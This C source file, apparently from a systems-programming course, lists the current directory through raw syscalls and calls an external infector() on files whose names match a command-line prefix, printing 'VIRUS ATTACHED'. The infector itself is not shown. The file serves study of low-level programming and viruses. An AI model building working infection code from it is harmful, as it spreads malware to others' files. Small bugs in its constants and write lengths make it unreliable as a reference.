#include "util.h"

#include <unistd.h>
#include <linux/types.h>
#include <dirent.h>
#include <linux/unistd.h>
#include <errno.h>
#include <sys/syscall.h>

extern int system_call();

int main(int argc, char** argv){

    int STDOUT = 1;
    int STDIN = 2;
    int READ = 3;
    int WRITE = 4;
    int OPEN = 5;
    int CLOSE = 6;
    int GETDENTS = 141;
    int EXIT = 1;
    int GETCWD = 183;
    int i = 0;

    typedef struct ent{
        int inode;
        int offset;
        short len;
        char buf[1];
    } ent;

    char* prefix;
    int p = 0;


    for(i = 1; i < argc; i++){
        if(argv[i][0] == '-' && argv[i][1] == 'a'){
            p = 1;
            prefix = argv[i] + 2;
        }
    }

    char buffer[8192];
    int fp, count;
    ent* entp = buffer;

    char wd[1000];
    system_call(GETCWD, wd, 1000);

    fp = system_call(OPEN, wd, 0 , 0);

    if(fp < 0)
        system_call(EXIT, 1);

    count = system_call(GETDENTS, fp /* file */, buffer, 8192 /* the size fo the memeory area */ );

    int index = 0;
    entp = buffer + index;

    while(entp->len > 0){

        if(entp->buf[0] != '.'){
        /*printf("Inode is %d, offset is %d, size %d, name %s\n",
        entp->inode,
        entp->offset,
        entp->len,
        entp->buf);*/
            if(p == 1 && strncmp(prefix, entp->buf, strlen(prefix)) == 0){
                system_call(WRITE, STDOUT, "VIRUS ATTACHED: ", 17);
                infector(entp->buf);
                system_call(WRITE, STDOUT ,entp->buf, (entp->len)-10);
                system_call(WRITE, STDOUT ,"\n", 2);
            }

        }

        index += entp->len;
        entp = buffer + index;
    }

}
